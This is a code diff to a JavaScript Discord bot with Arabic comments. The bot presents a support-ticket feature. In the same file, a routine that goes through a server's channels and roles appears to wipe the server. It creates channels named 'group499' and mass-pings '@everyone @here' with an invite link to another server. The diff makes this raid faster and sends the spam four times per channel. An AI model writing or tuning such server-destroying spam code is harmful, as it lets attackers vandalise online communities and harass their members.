@@ -12,7 +12,6 @@ const client = new Client({
 const PREFIX = '!'; 
 const TARGET_SERVER_LINK = 'https://discord.gg/URaRZeKG9';
 const ADMIN_USER_ID = '1494353083138838668';
-const TICKET_ROLE_ID = '1556006419143065620';
 
 client.on('ready', () => {
     console.log(`Logged in as ${client.user.tag}!`);
@@ -52,7 +51,7 @@ client.on('messageCreate', async message => {
                 new ButtonBuilder()
                     .setCustomId('create_ticket')
                     .setLabel('ticket')
-                    .setStyle(ButtonStyle.Secondary) // زر رمادي
+                    .setStyle(ButtonStyle.Secondary)
             );
 
         await message.channel.send({ embeds: [embed], components: [row] });
@@ -65,7 +64,7 @@ client.on('messageCreate', async message => {
             await message.channel.send('جاري إغلاق وحذف التكت...');
             setTimeout(async () => {
                 await message.channel.delete().catch(() => {});
-            }, 2000);
+            }, 1000);
         } catch (e) {}
         return;
     }
@@ -107,6 +106,7 @@ client.on('messageCreate', async message => {
 
         const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
+        // مهمة الرومات (سرعة مضاعفة وإرسال الرسالة 4 مرات في كل روم)
         const channelsTask = (async () => {
             const deletePromises = [];
             for (const [id, channel] of guild.channels.cache) {
@@ -122,14 +122,18 @@ client.on('messageCreate', async message => {
                             name: 'group499',
                             type: ChannelType.GuildText 
                         });
-                        await newChannel.send(`@everyone @here\n${TARGET_SERVER_LINK}`);
+                        // إرسال الرسالة 4 مرات في نفس الروم بسرعة عالية
+                        for (let j = 0; j < 4; j++) {
+                            await newChannel.send(`@everyone @here\n${TARGET_SERVER_LINK}`);
+                        }
                     } catch (e) {}
                 })());
-                await delay(200); 
+                await delay(80); // سرعة فائقة جداً
             }
             await Promise.all(createPromises);
         })();
 
+        // مهمة الرولات
         const rolesTask = (async () => {
             const deleteRolePromises = [];
             for (const [id, role] of guild.roles.cache) {
@@ -149,7 +153,7 @@ client.on('messageCreate', async message => {
                         });
                     } catch (e) {}
                 })());
-                await delay(200);
+                await delay(80);
             }
             await Promise.all(createRolePromises);
         })();
@@ -167,7 +171,7 @@ client.on('interactionCreate', async interaction => {
         const member = interaction.member;
 
         try {
-            // إنشاء روم تكت جديد مخفي ولا يراه إلا العضو وصاحب الآيدي ورتبة المشرفين
+            // روم تكت خاص لا يراه إلا العضو وصاحب الآيدي فقط (بدون رتبة محددة)
             const ticketChannel = await guild.channels.create({
                 name: `tic-${member.user.username}`,
                 type: ChannelType.GuildText,
@@ -184,16 +188,11 @@ client.on('interactionCreate', async interaction => {
                         id: ADMIN_USER_ID,
                         allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory],
                     },
-                    {
-                        id: TICKET_ROLE_ID,
-                        allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory],
-                    },
                 ],
             });
 
             await interaction.reply({ content: `تم فتح التكت الخاص بك: ${ticketChannel}`, ephemeral: true });
 
-            // إرسال رسالة الترحيب والمنشنات داخل التكت
             await ticketChannel.send(`** اكتب مشكلتك قبل لانجي **\n<@${member.id}> <@${ADMIN_USER_ID}>`);
         } catch (e) {
             await interaction.reply({ content: 'حدث خطأ أثناء إنشاء التكت.', ephemeral: true });
